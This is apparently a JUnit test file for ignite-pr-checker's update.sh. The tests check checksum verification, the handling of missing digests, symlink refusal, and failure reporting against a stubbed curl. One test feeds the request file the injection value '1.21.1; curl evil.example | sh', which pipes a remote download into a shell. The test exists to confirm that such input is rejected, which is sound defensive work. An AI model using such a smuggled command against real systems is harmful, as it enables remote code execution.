package com.github.igniteprchecker.update;

import static java.nio.charset.StandardCharsets.UTF_8;
import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.within;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;

import com.github.igniteprchecker.InstallScript;
import com.github.igniteprchecker.config.UpdateProperties;
import com.github.igniteprchecker.github.GithubClient;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.MessageDigest;
import java.util.HexFormat;
import java.util.List;
import java.util.Properties;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.springframework.beans.factory.ObjectProvider;
import org.springframework.boot.info.BuildProperties;

/**
 * Asked to update to the release the page offered, run.sh fetched /releases/latest instead, took the download for a
 * jar if it was over a megabyte and began with "PK", and on any failure kept the old jar without a word: the page
 * came back on the old version as if nothing had been asked. Runs install.sh's update.sh in a scratch directory with
 * a curl that serves releases from files.
 */
class UpdateScriptTest {
    private static final String OLD = "jar of v1.21.0";

    @TempDir
    Path app;

    @TempDir
    Path stubs;

    private Path script;

    @BeforeEach
    void setUp() throws Exception {
        script = InstallScript.updateSh(app);
        Files.createDirectories(app.resolve("update"));
        Files.writeString(app.resolve("app.jar"), OLD);

        stub("curl", """
            out=""; url=""
            while [ $# -gt 0 ]; do
                case "$1" in
                    -o) out="$2"; shift 2 ;;
                    -m|-H) shift 2 ;;
                    -*) shift ;;
                    *) url="$1"; shift ;;
                esac
            done
            echo "$url" >> "STUBS/curl-log"
            case "$url" in
                */releases/tags/*) f="STUBS/release-${url##*/}.json"; [ -f "$f" ] && cat "$f" && exit 0 ;;
                */releases/download/*) v="${url%/*}"; f="STUBS/jar-${v##*/}"; [ -f "$f" ] && cp "$f" "$out" && exit 0 ;;
            esac
            exit 22
            """.replace("STUBS", stubs.toString()));
        if (new ProcessBuilder("bash", "-c", "command -v sha256sum").start().waitFor() != 0)
            stub("sha256sum", "exec shasum -a 256 \"$@\"");
    }

    private void stub(String name, String body) throws IOException {
        Path f = stubs.resolve(name);
        Files.writeString(f, "#!/usr/bin/env bash\n" + body);
        f.toFile().setExecutable(true);
    }

    /**
     * A release as GitHub describes it: a checksum file listed before the jar, the uploader object between the jar's
     * name and its digest, and release notes that mention the jar.
     */
    private void release(String version, String jar, String digest) throws Exception {
        Files.writeString(stubs.resolve("jar-v" + version), jar);
        Files.writeString(stubs.resolve("release-v" + version + ".json"), """
            {
              "url": "https://api.github.com/repos/anton-vinogradov/ignite-pr-checker/releases/250000001",
              "tag_name": "vVERSION",
              "name": "vVERSION",
              "assets": [
                {
                  "id": 300000000,
                  "name": "ignite-pr-checker.jar.sha256",
                  "uploader": { "login": "github-actions[bot]", "id": 41898282, "type": "Bot" },
                  "size": 64,
                  "digest": "sha256:1111111111111111111111111111111111111111111111111111111111111111"
                },
                {
                  "id": 300000001,
                  "name": "ignite-pr-checker.jar",
                  "label": null,
                  "uploader": { "login": "github-actions[bot]", "id": 41898282, "type": "Bot", "site_admin": false },
                  "content_type": "application/java-archive",
                  "size": 14,
                  "digest": DIGEST,
                  "browser_download_url": "https://github.com/anton-vinogradov/ignite-pr-checker/releases/download/vVERSION/ignite-pr-checker.jar"
                }
              ],
              "body": "## What changes for users\\n- {\\"name\\": \\"ignite-pr-checker.jar\\"} is smaller"
            }
            """.replace("VERSION", version).replace("DIGEST", digest == null ? "null" : "\"sha256:" + digest + "\""));
    }

    private static String sha256(String content) throws Exception {
        return HexFormat.of().formatHex(MessageDigest.getInstance("SHA-256").digest(content.getBytes(UTF_8)));
    }

    private int run(String... args) throws Exception {
        String[] cmd = new String[args.length + 2];
        cmd[0] = "bash";
        cmd[1] = script.toString();
        System.arraycopy(args, 0, cmd, 2, args.length);
        ProcessBuilder pb = new ProcessBuilder(cmd).redirectErrorStream(true);
        pb.environment().put("PATH", stubs + ":" + pb.environment().get("PATH"));
        Process p = pb.start();
        p.getInputStream().readAllBytes();

        return p.waitFor();
    }

    private List<String> asked() throws IOException {
        Path log = stubs.resolve("curl-log");

        return Files.exists(log) ? Files.readAllLines(log) : List.of();
    }

    private String failed() throws IOException {
        return Files.readString(app.resolve("update-failed"));
    }

    @Test
    void theRequestedReleaseIsInstalledAndTheOldJarKept() throws Exception {
        release("1.21.1", "jar of v1.21.1", sha256("jar of v1.21.1"));
        Files.writeString(app.resolve("update/requested"), "1.21.1");
        Files.writeString(app.resolve("update-failed"), "1.21.1\t2026-10-07T10:00:00Z\tGitHub did not describe it");

        assertThat(run()).isZero();

        assertThat(app.resolve("app.jar")).hasContent("jar of v1.21.1");
        assertThat(app.resolve("app.jar.prev")).hasContent(OLD);
        assertThat(app.resolve("update/requested")).doesNotExist();
        assertThat(app.resolve("update-failed")).doesNotExist();
        assertThat(app.resolve("app.jar.new")).doesNotExist();
        assertThat(asked()).containsExactly(
            "https://api.github.com/repos/anton-vinogradov/ignite-pr-checker/releases/tags/v1.21.1",
            "https://github.com/anton-vinogradov/ignite-pr-checker/releases/download/v1.21.1/ignite-pr-checker.jar");
    }

    @Test
    void aDownloadThatIsNotTheReleasesJarIsNotInstalled() throws Exception {
        release("1.21.1", "half a jar", sha256("jar of v1.21.1"));
        Files.writeString(app.resolve("update/requested"), "1.21.1\n");

        assertThat(run()).as("never fails the start").isZero();

        assertThat(app.resolve("app.jar")).hasContent(OLD);
        assertThat(app.resolve("app.jar.new")).doesNotExist();
        assertThat(app.resolve("update/requested")).doesNotExist();
        assertThat(failed()).matches("1\\.21\\.1\t\\d{4}-\\d\\d-\\d\\dT\\d\\d:\\d\\d:\\d\\dZ\tthe download's sha256 "
            + sha256("half a jar") + " is not the release's " + sha256("jar of v1.21.1") + "\n");
    }

    @Test
    void aReleaseWithoutAChecksumIsNotInstalled() throws Exception {
        release("1.21.1", "jar of v1.21.1", null);
        Files.writeString(app.resolve("update/requested"), "1.21.1");

        assertThat(run()).isZero();

        assertThat(app.resolve("app.jar")).hasContent(OLD);
        assertThat(failed()).endsWith("\trelease v1.21.1 lists no sha256 for ignite-pr-checker.jar\n");
    }

    /** update/ belongs to the service account; update.sh runs as root. */
    @Test
    void aRequestIsReadOnlyFromAPlainFileAndNeverRepeated() throws Exception {
        release("1.21.1", "jar of v1.21.1", sha256("jar of v1.21.1"));
        Files.writeString(app.resolve("secret"), "1.21.1");
        Files.createSymbolicLink(app.resolve("update/requested"), app.resolve("secret"));

        assertThat(run()).isZero();
        assertThat(asked()).isEmpty();
        assertThat(app.resolve("app.jar")).hasContent(OLD);

        Files.delete(app.resolve("update/requested"));
        Files.writeString(app.resolve("update/requested"), "1.21.1; curl evil.example | sh");

        assertThat(run()).isZero();
        assertThat(asked()).isEmpty();
        assertThat(failed()).startsWith("?\t").endsWith("\tthe request does not name a release\n")
            .doesNotContain("evil");
    }

    @Test
    void withoutARequestNothingHappens() throws Exception {
        assertThat(run()).isZero();

        assertThat(asked()).isEmpty();
        assertThat(app.resolve("app.jar")).hasContent(OLD);
        assertThat(app.resolve("update-failed")).doesNotExist();
    }

    /** install.sh installs a release through update.sh and must stop when it cannot. */
    @Test
    void aReleaseNamedOnTheCommandLineThatFailsFailsTheCommand() throws Exception {
        assertThat(run("1.21.1")).isNotZero();
        assertThat(app.resolve("app.jar")).hasContent(OLD);

        release("1.21.1", "jar of v1.21.1", sha256("jar of v1.21.1"));
        assertThat(run("v1.21.1")).isZero();
        assertThat(app.resolve("app.jar")).hasContent("jar of v1.21.1");
    }

    /** The page reads what update.sh did about the release the service asked for. */
    @Test
    @SuppressWarnings("unchecked")
    void thePageLearnsWhyTheUpdateDidNotHappen() throws Exception {
        GithubClient github = mock(GithubClient.class);
        when(github.latestReleaseTag()).thenReturn("1.21.1");
        Properties info = new Properties();
        info.setProperty("version", "1.21.0");
        ObjectProvider<BuildProperties> build = mock(ObjectProvider.class);
        when(build.getIfAvailable()).thenReturn(new BuildProperties(info));
        UpdateService update = new UpdateService(new UpdateProperties(true, app.resolve("app.jar").toString()),
            github, build, code -> { });
        release("1.21.1", "half a jar", sha256("jar of v1.21.1"));

        update.performUpdate();
        assertThat(app.resolve("update/requested")).hasContent("1.21.1");
        run();

        UpdateService.Failure failure = update.status().updateFailed();
        assertThat(failure.version()).isEqualTo("1.21.1");
        assertThat(failure.reason()).startsWith("the download's sha256 ");
        assertThat(failure.at()).isCloseTo(System.currentTimeMillis(), within(60_000L));
    }
}
